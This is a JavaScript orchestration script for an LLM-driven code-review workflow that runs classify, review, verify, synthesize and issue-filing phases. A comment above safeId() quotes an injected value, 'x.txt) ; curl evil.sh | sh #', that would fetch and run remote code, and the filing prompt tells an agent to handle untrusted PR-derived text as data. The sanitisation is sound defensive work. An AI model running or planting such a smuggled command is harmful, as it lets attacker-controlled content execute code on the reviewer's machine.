export const meta = {
  name: 'review-workflow',
  description:
    'Workflow-backed soleur:review — deterministic change-class fan-out (always-on + conditional dimensions), budget-capped per-finding adversarial verification (no-barrier pipeline), provenance-driven disposition, and CONCUR-gated deferred-scope-out filing.',
  // Same phase titles as the phase() calls below so progress groups line up.
  phases: [
    { title: 'Classify', detail: 'one agent computes change class + diff stats + conditional triggers' },
    { title: 'Review', detail: 'always-on + conditional dimension agents, in parallel' },
    { title: 'Verify', detail: 'adversarial skeptics refute each finding as its dimension lands (budget-floored)' },
    { title: 'Synthesize', detail: 'dedup, provenance disposition' },
    { title: 'File', detail: 'CONCUR-gated deferred-scope-out filing (dry-run unless args.file)' },
  ],
}

// ---------------------------------------------------------------------------
// Input. args may be a bare string (the review target) or an object:
//   { target, deepReview, file }
//   target:     PR number, branch name, or '' (current branch vs origin/main)
//   deepReview: force the full always-on 8-dimension pass AND 3 skeptics/finding
//   file:       actually create deferred-scope-out GitHub issues (default: dry-run)
// ---------------------------------------------------------------------------
const target = (typeof args === 'string' ? args : args?.target) || ''
const deepReview =
  (typeof args === 'object' && !!args?.deepReview) ||
  (typeof target === 'string' && /deep review|full review/i.test(target))
const fileScopeOuts = typeof args === 'object' && !!args?.file
const range = 'origin/main...HEAD'

// Parallel-safe diff access: for a PR number every agent reads the diff
// read-only via `gh pr diff <N>` (concurrent `gh pr checkout` would race on a
// shared working tree). For a branch/empty target, use the local range.
const isPR = /^\d+$/.test(String(target).trim())
const prNum = isPR ? String(target).trim() : null
const diffCmd = isPR ? `gh pr diff ${prNum}` : `git diff ${range}`
const fileDiffCmd = isPR
  ? `gh pr diff ${prNum} (locate the file's section; gh pr diff has no pathspec filter)`
  : `git diff ${range} -- <file>`
const targetClause = isPR
  ? `Review target: PR #${prNum}. Read the change READ-ONLY via \`${diffCmd}\` (do NOT \`gh pr checkout\` — other agents share this working tree). For context beyond the diff, read the file on the current branch or \`gh api\` the PR head.`
  : target
    ? `Review target: branch "${target}". Diff range: ${range} (\`${diffCmd}\`).`
    : `Review target: the current branch. Diff range: ${range} (\`${diffCmd}\`).`

// ---------------------------------------------------------------------------
// Dimension registry. Each lens reuses the REAL Soleur reviewer agent via
// agentType, so the workflow inherits that agent's system prompt and only
// appends the StructuredOutput instruction. One source of review expertise.
// ---------------------------------------------------------------------------
const DIMENSIONS = {
  // --- always-on (class-gated) ---
  'git-history':    { agentType: 'soleur:engineering:research:git-history-analyzer',        lens: 'commit-history archaeology; verify deletion/bump/refactor rationale against cited PRs and issues' },
  pattern:          { agentType: 'soleur:engineering:review:pattern-recognition-specialist', lens: 'design patterns, anti-patterns, code duplication, naming conventions' },
  architecture:     { agentType: 'soleur:engineering:review:architecture-strategist',        lens: 'architectural compliance and system-design fit of the change' },
  security:         { agentType: 'soleur:engineering:review:security-sentinel',              lens: 'OWASP/CWE flaws, hardcoded secrets, authz, multi-org/workspace boundary integrity (R1–R6)' },
  performance:      { agentType: 'soleur:engineering:review:performance-oracle',             lens: 'algorithmic complexity, DB queries, caching, memory, scalability' },
  'data-integrity': { agentType: 'soleur:engineering:review:data-integrity-guardian',        lens: 'migrations, data models, persistence safety, PII handling' },
  'agent-native':   { agentType: 'soleur:engineering:review:agent-native-reviewer',          lens: 'agent-user parity — any action/context a user has, an agent has too' },
  'code-quality':   { agentType: 'soleur:engineering:review:code-quality-analyst',           lens: 'code smells, severity-scored quality, refactoring roadmap' },
  // --- conditional (trigger-gated) ---
  'rails-kieran':   { agentType: 'soleur:engineering:review:kieran-rails-reviewer',          lens: 'strict Rails conventions, naming, controller complexity, Turbo patterns' },
  'rails-dhh':      { agentType: 'soleur:engineering:review:dhh-rails-reviewer',             lens: 'Rails philosophy, JS-framework contamination, unnecessary abstraction' },
  'data-migration': { agentType: 'soleur:engineering:review:data-migration-expert',          lens: 'ID-mapping correctness vs production, swapped values, rollback safety, dual-write' },
  'deploy-verify':  { agentType: 'soleur:engineering:review:deployment-verification-agent',  lens: 'Go/No-Go deploy checklist with SQL verification queries and rollback procedure' },
  'test-design':    { agentType: 'soleur:engineering:review:test-design-reviewer',           lens: "Farley's 8 properties; weighted Test Quality Score + top improvements" },
  semgrep:          { agentType: 'soleur:engineering:review:semgrep-sast', deterministic: true, lens: 'deterministic SAST — bootstrap via plugins/soleur/skills/review/scripts/ensure-semgrep.sh first, then scan changed source for CWE/secret/taint signatures' },
  'user-impact':    { agentType: 'soleur:engineering:review:user-impact-reviewer',           lens: 'enumerate concrete user-facing failure modes (cross-tenant read, credential leak, data loss, double-charge) vs the plan threshold' },
  // --- deterministic tools (no agentType; run a scanner/skill, taken as ground truth) ---
  shellcheck: {
    deterministic: true,
    lens: 'shellcheck on changed shell scripts (the bash substitute for semgrep, which cannot analyze bash)',
    prompt: () =>
      `Run shellcheck on the shell scripts changed in this diff. ${targetClause}
List changed *.sh/*.bash/*.zsh files (\`${diffCmd}\`). If shellcheck is not installed, install it (\`apt-get install -y shellcheck\` / \`brew install shellcheck\`) — do not skip silently. Run \`shellcheck -f gcc <files>\`. Map each result to a finding: error→P1, warning→P2, info/style→P3; id = the SC code (e.g. SC2086); provenance = pr-introduced if the flagged line is in the diff, else pre-existing; fixSizeLines ≈ 1–3. Empty findings array if shellcheck is clean.`,
  },
  'anti-slop': {
    deterministic: true,
    lens: 'frontend anti-slop Tier-1 scanner (brand high-severity findings are a REQUIRED-FIX gate)',
    prompt: () =>
      `Run the deterministic frontend anti-slop Tier-1 scanner on the changed frontend files. ${targetClause}
Collect changed paths matching \`apps/web-platform/(app|components)/.*\\.(tsx|jsx|css)$\`, \`apps/web-platform/server/.*\\.(ts|tsx)$\`, or \`plugins/soleur/docs/.*\\.(njk|css)$\`. Run: \`bun run plugins/soleur/skills/frontend-anti-slop/scripts/tier1-scan.ts --paths <files> --json\`. Parse the JSON array. Map each to a finding: a finding whose rule is category=brand AND severity=high (BRAND-RAW-HEX, BRAND-WHITE-ON-GOLD) → P1 (required-fix, the scanner exits non-zero); all other findings → P3 (advisory, calibration mode). id = the rule id; provenance = pr-introduced. Empty array if the scanner is clean.`,
  },
  gdpr: {
    deterministic: true,
    lens: 'real soleur:gdpr-gate skill — Art. 9 / RoPA / lawful-basis deterministic checks',
    prompt: () =>
      `Audit this change for GDPR/CCPA exposure by invoking the real gate. ${targetClause}
Use the Skill tool to run \`soleur:gdpr-gate\` against the diff (it runs deterministic Art. 9 special-category / RoPA / lawful-basis pattern checks). Translate its output into findings: Critical Art. 9 findings → P1; RoPA / lawful-basis gaps → P2; advisory → P3. id = the gate's rule/check name; provenance = pr-introduced when the regulated-data surface is added/modified by this diff. Empty array if the gate reports clean.`,
  },
}

// Deterministic class → always-on dimension mapping. The classify agent reports
// a class; the SCRIPT (not the model) owns which dimensions that class runs.
const CLASS_DIMENSIONS = {
  code: ['git-history', 'pattern', 'architecture', 'security', 'performance', 'data-integrity', 'agent-native', 'code-quality'],
  'non-code': ['git-history', 'pattern', 'security', 'code-quality'],
  'lockfile-only': ['git-history', 'security'],
  'deletion-dominated': ['git-history', 'security'],
}

// Conditional dimensions, gated on the classify agent's trigger flags. Mirrors
// SKILL.md §"Conditional Agents". The fan-out decision stays in code.
function conditionalDimensions(t = {}) {
  const dims = []
  if (t.isRailsApp && t.hasRubyChange) dims.push('rails-kieran', 'rails-dhh')
  if (t.hasMigration) dims.push('data-migration', 'deploy-verify')
  if (t.hasTests) dims.push('test-design')
  if (t.hasSource && t.bashOnly) dims.push('shellcheck') // bash → shellcheck (semgrep can't parse bash; SKILL.md note)
  else if (t.hasSource) dims.push('semgrep')
  if (t.gdprMatch) dims.push('gdpr')
  if (t.antiSlop) dims.push('anti-slop')
  if (t.userImpactThreshold) dims.push('user-impact')
  return dims
}

// ---------------------------------------------------------------------------
// Schemas — validated at the tool-call layer, so agents retry on mismatch.
// ---------------------------------------------------------------------------
const CLASSIFY_SCHEMA = {
  type: 'object',
  required: ['class', 'changedFiles', 'totalFiles', 'totalLines', 'hasSource', 'rationale', 'triggers'],
  additionalProperties: false,
  properties: {
    class: { type: 'string', enum: ['code', 'non-code', 'lockfile-only', 'deletion-dominated'] },
    changedFiles: { type: 'array', items: { type: 'string' } },
    totalFiles: { type: 'integer' },
    totalLines: { type: 'integer' },
    deletedFilesPct: { type: 'number' },
    deletedLinesPct: { type: 'number' },
    hasSource: { type: 'boolean' },
    anyLockfile: { type: 'boolean' },
    rationale: { type: 'string' },
    triggers: {
      type: 'object',
      required: ['isRailsApp', 'hasRubyChange', 'hasMigration', 'hasTests', 'hasSource', 'bashOnly', 'gdprMatch', 'antiSlop', 'userImpactThreshold'],
      additionalProperties: false,
      properties: {
        isRailsApp: { type: 'boolean', description: 'repo root has BOTH Gemfile and config/routes.rb' },
        hasRubyChange: { type: 'boolean', description: 'diff changes any *.rb file' },
        hasMigration: { type: 'boolean', description: 'diff touches db/migrate/*.rb or supabase/migrations/*' },
        hasTests: { type: 'boolean', description: 'diff touches a test/spec file (*.test.*, *_spec.rb, test_*.py, *_test.go, __tests__/…)' },
        hasSource: { type: 'boolean' },
        bashOnly: { type: 'boolean', description: 'every changed source file is .sh/.bash/.zsh (semgrep cannot analyze; use shellcheck)' },
        gdprMatch: { type: 'boolean', description: 'a changed path matches the gdpr-gate canonical path globs (regulated-data surfaces)' },
        antiSlop: { type: 'boolean', description: 'a changed path matches apps/web-platform/(app|components)/*.{tsx,jsx,css}, apps/web-platform/server/*.{ts,tsx}, or plugins/soleur/docs/*.{njk,css}' },
        userImpactThreshold: { type: 'boolean', description: 'the PR body or its linked plan declares "Brand-survival threshold: single-user incident"' },
      },
    },
  },
}

const FINDINGS_SCHEMA = {
  type: 'object',
  required: ['findings'],
  additionalProperties: false,
  properties: {
    findings: {
      type: 'array',
      items: {
        type: 'object',
        required: ['id', 'title', 'severity', 'file', 'description', 'provenance', 'fixSizeLines'],
        additionalProperties: false,
        properties: {
          id: { type: 'string', pattern: '^[A-Za-z0-9._-]{1,40}$', description: 'short stable filename-safe slug, unique within this dimension' },
          title: { type: 'string' },
          severity: { type: 'string', enum: ['P1', 'P2', 'P3'] },
          file: { type: 'string' },
          line: { type: 'integer' },
          description: { type: 'string' },
          provenance: { type: 'string', enum: ['pr-introduced', 'pre-existing'] },
          fixSizeLines: { type: 'integer', description: 'estimated LOC to fix' },
          filesTouched: { type: 'integer', description: 'estimated files the fix touches' },
          suggestedFix: { type: 'string' },
        },
      },
    },
  },
}

const VERDICT_SCHEMA = {
  type: 'object',
  required: ['isReal', 'confidence', 'reason'],
  additionalProperties: false,
  properties: {
    isReal: { type: 'boolean', description: 'true only if the finding survives refutation' },
    confidence: { type: 'string', enum: ['low', 'medium', 'high'] },
    reason: { type: 'string' },
  },
}

const CONCUR_SCHEMA = {
  type: 'object',
  required: ['decision', 'reason'],
  additionalProperties: false,
  properties: {
    decision: { type: 'string', enum: ['CONCUR', 'DISSENT'], description: 'CONCUR co-signs the scope-out filing; DISSENT flips to fix-inline' },
    reason: { type: 'string', description: 'one sentence' },
  },
}

// ---------------------------------------------------------------------------
// Prompt builders.
// ---------------------------------------------------------------------------
const classifyPrompt = `You are the change-classification gate for a Soleur code review.
${targetClause}

Compute, over the change (source of truth: \`${diffCmd}\`${isPR ? `; file list via \`gh pr view ${prNum} --json files,body\`` : ''}):
- changedFiles, totalFiles, deleted file/line counts, totalLines = added+deleted
- hasSource = any changed path matches \\.(ts|tsx|js|jsx|rb|py|go|rs|swift|kt|java|c|cpp|cs|php|sh|bash|zsh|mjs|cjs)$
- anyLockfile = any path matches package-lock.json|bun.lock|yarn.lock|Cargo.lock|go.sum|Gemfile.lock|poetry.lock|uv.lock

Apply this decision tree, FIRST MATCH WINS:
1. lockfile-only: every non-lockfile change is knowledge-base/** or *.md AND anyLockfile AND NOT hasSource.
2. deletion-dominated: totalFiles>0 AND totalLines>0 AND deletedFiles≥80% AND deletedLines≥80% AND NOT hasSource.
3. code: hasSource.
4. non-code: otherwise.

Also compute the conditional triggers (booleans) — inspect the repo and the diff:
- isRailsApp: repo root has BOTH Gemfile and config/routes.rb.
- hasRubyChange: diff changes any *.rb file.
- hasMigration: diff touches db/migrate/*.rb OR supabase/migrations/*.
- hasTests: diff touches any test/spec file (*.test.ts/js, *.spec.ts/js, *_spec.rb, test_*.py, *_test.py, *_test.go, *Tests.swift, or files under __tests__/ test/ spec/).
- bashOnly: hasSource is true AND every changed source file is .sh/.bash/.zsh.
- gdprMatch: any changed path looks like a regulated-data surface (auth, billing, PII, consent, user/profile/account data models, supabase migrations on personal data). Be conservative — only true on a clear match.
- antiSlop: any changed path matches apps/web-platform/(app|components)/*.{tsx,jsx,css}, apps/web-platform/server/*.{ts,tsx}, or plugins/soleur/docs/*.{njk,css}.
- userImpactThreshold: the PR body OR its linked plan file contains the literal "Brand-survival threshold: single-user incident".

Return the classification object. Do NOT review the code — only classify.`

function reviewPrompt(dim) {
  const d = DIMENSIONS[dim]
  return `You are reviewing a code change through ONE lens: ${d.lens}.
${targetClause}

Read the diff (\`${diffCmd}\`) and any surrounding context you need. Report ONLY findings within your lens. For each finding:
- Assign severity P1 (critical) / P2 (important) / P3 (nice-to-have).
- Tag provenance: "pr-introduced" if this change added/modified the critiqued code (inspect ${fileDiffCmd}), else "pre-existing". When ambiguous, default to pr-introduced.
- Estimate fixSizeLines and filesTouched for the smallest correct fix.
Be precise and conservative — a finding you cannot defend will be refuted in the next stage. Return an empty findings array if the diff is clean for your lens.`
}

const VERIFY_LENSES = [
  { key: 'correctness', ask: 'Is the finding technically correct against the real code, or a false positive / misread?' },
  { key: 'scope', ask: 'Is the finding actually in-scope for THIS diff, or pre-existing/unrelated noise dressed up as a PR concern?' },
  { key: 'already-handled', ask: 'Is the concern already handled elsewhere (a guard, a sibling, an existing test, a convention) so the finding is moot?' },
]

function verifyPrompt(f, lens) {
  return `Adversarially verify this code-review finding through the "${lens.key}" lens: ${lens.ask}
Your DEFAULT is that it is NOT real — set isReal=false unless the evidence is concrete and survives your lens.

Finding:
- title: ${f.title}
- severity: ${f.severity}
- file: ${f.file}${f.line ? `:${f.line}` : ''}
- provenance: ${f.provenance}
- description: ${f.description}
${f.suggestedFix ? `- proposed fix: ${f.suggestedFix}` : ''}

${targetClause}
Inspect the actual code (read the change via \`${diffCmd}\`, locate ${f.file}, read the file for context). Only return isReal=true if the finding genuinely holds.`
}

function concurPrompt(f) {
  return `You are the simplicity-biased SECOND reviewer on a proposed deferred-scope-out filing. DEFAULT to DISSENT (i.e. fix inline). Only CONCUR when a scope-out criterion is concretely and obviously satisfied.

Proposed scope-out:
- finding: ${f.title} (${f.severity}) — ${f.file}
- description: ${f.description}
- proposed fix: ${f.suggestedFix || '(none stated)'}
- size: ${f.fixSizeLines} lines / ${f.filesTouched ?? '?'} files
- provenance: ${f.provenance}

The FOUR scope-out criteria (a filing needs at least one, AND a concrete re-eval trigger):
1. cross-cutting-refactor — fix touches ≥3 files materially unrelated to this PR's core change.
2. contested-design — the REVIEW AGENT (not the author) independently named ≥2 valid approaches trading off differently, recommending a separate design cycle.
3. architectural-pivot — fix changes a codebase-wide pattern deserving its own planning cycle.
4. pre-existing-unrelated — finding existed on main and is not exacerbated by this PR. NEVER valid for pr-introduced findings.

Hard rules: pr-introduced findings MUST fix inline (auto-DISSENT). A fix ≤100 lines AND ≤4 files MUST fix inline (auto-DISSENT). DISSENT on any vague re-eval trigger.
Reply with decision CONCUR or DISSENT and a one-sentence reason.`
}

// Builds the File-phase agent prompt that creates a deferred-scope-out issue.
// fid is the sanitized finding id (filename-safe); title/body are pre-built and
// passed as DATA the agent writes to temp files — never interpolated into a
// command. The title flows through `--title "$(cat …)"` (double-quoted command
// substitution, not re-parsed); the body goes via --body-file (never shell-parsed).
function fileIssuePrompt(fid, safeTitleStr, issueBody) {
  return `File a co-signed deferred-scope-out GitHub issue. Do EXACTLY these steps; do not improvise the shell or interpolate the title/body into a command:
1. Use the Write tool to write the text between the BODY markers (verbatim, it is data not a command) to \`/tmp/scopeout-body-${fid}.md\`.
2. Use the Write tool to write the text between the TITLE markers (verbatim) to \`/tmp/scopeout-title-${fid}.txt\`.
3. Run exactly: gh issue create --label deferred-scope-out --title "$(cat /tmp/scopeout-title-${fid}.txt)" --body-file /tmp/scopeout-body-${fid}.md
   (the title is double-quoted command substitution — do not unquote it; the body goes via --body-file so it is never shell-parsed.)
4. Return the created issue URL as plain text.

---TITLE START---
${safeTitleStr}
---TITLE END---

---BODY START---
${issueBody}
---BODY END---`
}

// Harden untrusted finding text before it can reach an issue TITLE (which an
// agent passes as a shell argv to `gh`). Finding titles derive from the diff
// under review — i.e. potentially attacker-controlled PR content. Strip control
// chars + shell metacharacters, collapse whitespace, cap length. The constant
// "review: " prefix (added at the call site) guarantees no leading "-", which
// blocks argv flag-smuggling into gh.
function safeTitle(raw) {
  return String(raw)
    .replace(/[\x00-\x1f\x7f]/g, " ") // control chars incl. newlines
    .replace(/[`$"'\\;|&<>(){}[\]!*?~#]/g, ' ') // shell metacharacters, backslash, brackets
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, 120)
}

// Harden the finding `id` before it reaches a shell argv / temp-file path. The
// id is an LLM-authored slug derived from the diff under review (attacker-
// influenceable) and FINDINGS_SCHEMA.id has no pattern constraint, so a value
// like `x.txt) ; curl evil.sh | sh #` would otherwise close the `$(cat …)`
// substitution in the filing command. Allow only filename-safe characters.
// Mirrors resolve-todo-parallel.workflow.js's safeId() rationale.
function safeId(raw, fallback = 'finding') {
  const s = String(raw).replace(/[^A-Za-z0-9._-]/g, '').replace(/^[.-]+/, '').slice(0, 40)
  return s || fallback
}

// Deterministic disposition — replaces the SKILL's prose cost-of-filing gate.
function disposition(f) {
  if (f.provenance === 'pr-introduced') return 'fix-inline'
  const lines = f.fixSizeLines ?? 999
  const files = f.filesTouched ?? 9
  if (lines <= 30 && files <= 2) return 'fix-inline'
  return 'scope-out-candidate'
}

// ---------------------------------------------------------------------------
// Budget. The verification fan-out is the expensive part; floor it so we keep
// headroom for synthesis + filing. NEVER silently skip — log dropped coverage.
// ---------------------------------------------------------------------------
const VERIFY_FLOOR = 80_000 // output tokens to reserve past verification
const SKEPTICS = deepReview ? 3 : 1 // perspective-diverse panel when deep
const droppedVerification = []

function budgetOk() {
  return !budget.total || budget.remaining() > VERIFY_FLOOR
}

// Deterministic-tool findings (shellcheck / semgrep / anti-slop / gdpr-gate)
// are ground truth — adversarially refuting an SC2086 or a BRAND-RAW-HEX hit is
// wrong AND wasteful. Auto-confirm them; only LLM-judgment findings get verified.
function autoConfirm(f, dim) {
  return {
    ...f,
    dimension: dim,
    deterministic: true,
    verdict: { isReal: true, confidence: 'high', reason: 'deterministic tool/skill finding — taken as ground truth, not adversarially verified.' },
  }
}

async function verifyFinding(f, dim) {
  if (!budgetOk()) {
    droppedVerification.push(`${dim}:${f.id}`)
    // Conservative: surface UNVERIFIED rather than drop the finding entirely.
    return {
      ...f,
      dimension: dim,
      unverified: true,
      verdict: { isReal: true, confidence: 'low', reason: `UNVERIFIED — token budget floor (${VERIFY_FLOOR}) reached; surfaced without adversarial check.` },
    }
  }
  const lenses = VERIFY_LENSES.slice(0, SKEPTICS)
  const votes = (
    await parallel(
      lenses.map((lens) => () =>
        agent(verifyPrompt(f, lens), { label: `verify:${dim}:${f.id}:${lens.key}`, phase: 'Verify', schema: VERDICT_SCHEMA }),
      ),
    )
  ).filter(Boolean)
  // Majority-real survives. No votes (all errored) → conservative keep.
  const realVotes = votes.filter((v) => v.isReal).length
  const isReal = votes.length ? realVotes >= Math.ceil(votes.length / 2) : true
  // Best reason = the deciding side's highest-confidence vote.
  const conf = { low: 0, medium: 1, high: 2 }
  const side = votes.filter((v) => v.isReal === isReal).sort((a, b) => conf[b.confidence] - conf[a.confidence])[0]
  return {
    ...f,
    dimension: dim,
    votes: votes.length,
    verdict: side || { isReal, confidence: 'low', reason: 'no verifier returned' },
  }
}

// ---------------------------------------------------------------------------
// Run.
// ---------------------------------------------------------------------------
phase('Classify')
log('tier pins: classify→sonnet, file→haiku (mechanical steps per ADR-053; judgment steps inherit the session model)')
// Pinned 'sonnet': schema-constrained diff-class classification is mechanical (ADR-053).
const classification = await agent(classifyPrompt, { label: 'classify', phase: 'Classify', schema: CLASSIFY_SCHEMA, model: 'sonnet' })
if (!classification) {
  // Classify agent died (terminal API error). Without a class we cannot fan out
  // the right dimensions — fail loudly rather than dereference null.
  log('Classify agent returned no result — aborting review.')
  return { error: 'classify-failed', target: isPR ? `PR #${prNum}` : target || '(current branch)' }
}

const cls = deepReview ? 'code' : classification.class
const alwaysOn = CLASS_DIMENSIONS[cls] || CLASS_DIMENSIONS.code
const conditional = conditionalDimensions(classification.triggers)
const dims = [...alwaysOn, ...conditional]
log(
  `Class: ${cls}${deepReview ? ' (forced)' : ''} — ${classification.totalFiles} files / ${classification.totalLines} lines. ` +
    `${alwaysOn.length} always-on + ${conditional.length} conditional` +
    `${conditional.length ? ` (${conditional.join(', ')})` : ''} = ${dims.length} dimensions, ${SKEPTICS} skeptic(s)/finding.`,
)

// Pipeline: NO barrier between Review and Verify. The moment a dimension review
// lands, its findings start getting refuted while other dimensions still read.
const perDimension = await pipeline(
  dims,
  (dim) =>
    agent(DIMENSIONS[dim].prompt ? DIMENSIONS[dim].prompt() : reviewPrompt(dim), {
      label: `review:${dim}`,
      phase: 'Review',
      schema: FINDINGS_SCHEMA,
      agentType: DIMENSIONS[dim].agentType, // undefined for tool/skill dims → default agent
    }),
  (review, dim) =>
    parallel((review?.findings || []).map((f) => () => (DIMENSIONS[dim].deterministic ? Promise.resolve(autoConfirm(f, dim)) : verifyFinding(f, dim)))),
)

phase('Synthesize')
const all = perDimension.flat().filter(Boolean)
const confirmed = all.filter((f) => f.verdict?.isReal)
const refuted = all.filter((f) => !f.verdict?.isReal)

// Dedup confirmed by file + normalized title (cross-dimension overlap).
const seen = new Set()
const deduped = []
for (const f of confirmed) {
  const key = `${f.file}::${f.title.trim().toLowerCase().slice(0, 60)}`
  if (seen.has(key)) continue
  seen.add(key)
  deduped.push({ ...f, disposition: disposition(f) })
}
const order = { P1: 0, P2: 1, P3: 2 }
deduped.sort((a, b) => order[a.severity] - order[b.severity] || a.file.localeCompare(b.file))

// -------------------------------------------------------------------------
// File: CONCUR-gated deferred-scope-out filing. Every scope-out candidate is
// independently co-signed by a simplicity-biased reviewer (DEFAULT DISSENT).
// DISSENT flips back to fix-inline. CONCUR → file (only if args.file), else
// emit the would-file payload (dry-run).
// -------------------------------------------------------------------------
phase('File')
const candidates = deduped.filter((f) => f.disposition === 'scope-out-candidate')
const filings = []
if (candidates.length) {
  const judged = await parallel(
    candidates.map((f) => () => agent(concurPrompt(f), { label: `concur:${f.dimension}:${f.id}`, phase: 'File', schema: CONCUR_SCHEMA }).then((c) => ({ f, concur: c }))),
  )
  const judgedOk = judged.filter(Boolean)
  for (let idx = 0; idx < judgedOk.length; idx++) {
    const j = judgedOk[idx]
    if (j.concur.decision !== 'CONCUR') {
      // Gate flipped it: fix inline after all.
      j.f.disposition = 'fix-inline'
      filings.push({ finding: j.f.title, file: j.f.file, action: 'flipped-to-fix-inline', why: j.concur.reason })
      continue
    }
    const issueBody = `## Scope-Out Justification\n\nFrom code review of ${isPR ? `PR #${prNum}` : target || 'current branch'}.\n\n**Finding:** ${j.f.title} (${j.f.severity}, ${j.f.dimension})\n**File:** ${j.f.file}${j.f.line ? `:${j.f.line}` : ''}\n**Provenance:** ${j.f.provenance}\n\n${j.f.description}\n\n**Proposed fix:** ${j.f.suggestedFix || '(see description)'}\n\n**CONCUR rationale:** ${j.concur.reason}`
    // Title and body both derive from untrusted diff content. Sanitize the
    // title (it becomes a shell argv) and pass title + body to the agent as
    // DATA to write to files with its Write tool — never as an interpolated
    // command. The constant "review: " prefix guarantees no leading "-".
    const safeTitleStr = `review: ${safeTitle(j.f.title)}`
    // safeId neutralizes the LLM-authored id before it reaches the temp-file
    // paths AND the `$(cat …)` substitution in the gh command (P1 fix).
    const fid = safeId(j.f.id, `${idx}`)
    if (fileScopeOuts) {
      // Pinned 'haiku': template-fill GitHub issue filing from one structured finding (ADR-053).
      const filed = await agent(fileIssuePrompt(fid, safeTitleStr, issueBody), { label: `file:${fid}`, phase: 'File', model: 'haiku' })
      filings.push({ finding: j.f.title, file: j.f.file, action: 'filed', url: filed })
    } else {
      filings.push({ finding: j.f.title, file: j.f.file, action: 'dry-run', wouldFileTitle: safeTitleStr, wouldFileBody: issueBody })
    }
  }
}

const report = {
  target: isPR ? `PR #${prNum}` : target || '(current branch)',
  class: cls,
  dimensionsRun: { alwaysOn, conditional },
  skepticsPerFinding: SKEPTICS,
  budget: { total: budget.total, spent: budget.spent(), droppedVerification },
  totals: {
    raised: all.length,
    confirmed: deduped.length,
    refuted: refuted.length,
    fixInline: deduped.filter((f) => f.disposition === 'fix-inline').length,
    scopeOutCandidates: deduped.filter((f) => f.disposition === 'scope-out-candidate').length,
    filed: filings.filter((x) => x.action === 'filed').length,
    flippedToFixInline: filings.filter((x) => x.action === 'flipped-to-fix-inline').length,
  },
  bySeverity: {
    P1: deduped.filter((f) => f.severity === 'P1'),
    P2: deduped.filter((f) => f.severity === 'P2'),
    P3: deduped.filter((f) => f.severity === 'P3'),
  },
  findings: deduped,
  filings,
  refuted: refuted.map((f) => ({ title: f.title, file: f.file, dimension: f.dimension, reason: f.verdict?.reason })),
}

if (droppedVerification.length) {
  log(`⚠ budget floor hit — ${droppedVerification.length} finding(s) surfaced UNVERIFIED: ${droppedVerification.join(', ')}`)
}
log(
  `Done: ${deduped.length} confirmed (${report.totals.fixInline} fix-inline, ` +
    `${report.totals.scopeOutCandidates} scope-out → ${report.totals.filed} filed / ${report.totals.flippedToFixInline} flipped), ${refuted.length} refuted.`,
)

return report
